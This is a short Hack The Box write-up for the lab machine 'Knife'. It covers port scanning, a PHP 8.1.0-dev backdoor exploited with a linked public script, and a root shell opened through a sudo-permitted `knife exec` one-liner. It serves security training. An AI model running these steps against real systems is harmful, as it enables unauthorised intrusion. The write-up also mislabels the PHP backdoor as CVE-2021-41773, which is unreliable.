Knife - Hack The Box Write-Up

Difficulty: Easy
Author: ch4p
Enumeration
1. Nmap Scan

I started by scanning for open ports with nmap:

nmap -p- -sC -sV -oN nmap.txt <target-ip>

Results:

22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.41

    Port 22 (SSH) → Standard SSH, no immediate entry point.

    Port 80 (HTTP) → A webpage with no visible content.

Web Enumeration

Visiting port 80, I found an almost empty page. Checking the source code also revealed nothing useful.

I then ran ffuf to look for hidden directories and subdomains:

ffuf -u http://<target-ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://<target-ip> -H "Host: FUZZ.<target-ip>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

Both scans returned nothing useful.
PHP 8.1.0-dev Remote Code Execution

Checking the HTTP headers and response, I noticed the server was running PHP 8.1.0-dev, which is vulnerable to a backdoor RCE (CVE-2021-41773).

Googled for public exploits and found this:https://github.com/flast101/php-8.1.0-dev-backdoor-rce?tab=readme-ov-file

Using the script and setting up the listener I was able to gain user privilege.

Boom! I got a shell as Jamie.

Privilege Escalation

Once inside, I grabbed the user flag:

cat /home/jamie/user.txt

Then, I checked for sudo permissions:

sudo -l

Output:

User jamie may run the following command on knife:
    (ALL) NOPASSWD: /usr/bin/knife

The knife tool (part of Chef) allows command execution.
Root Privilege Escalation

I used knife to execute a root shell:

sudo knife exec -E 'exec "/bin/bash"'

Now, running whoami confirmed root access.

I then retrieved the root flag:

cat /root/root.txt

Summary

    Enumeration: Found PHP 8.1.0-dev running on port 80.

    Exploitation: Used the public RCE exploit to gain a shell as Jamie.

    Privilege Escalation: Found sudo access to knife and used it to get root.

Lessons Learned:

    Always check for software versions—they can reveal known vulnerabilities.

    Use sudo -l to find misconfigurations for privilege escalation.

    The knife tool is dangerous when misconfigured with sudo!
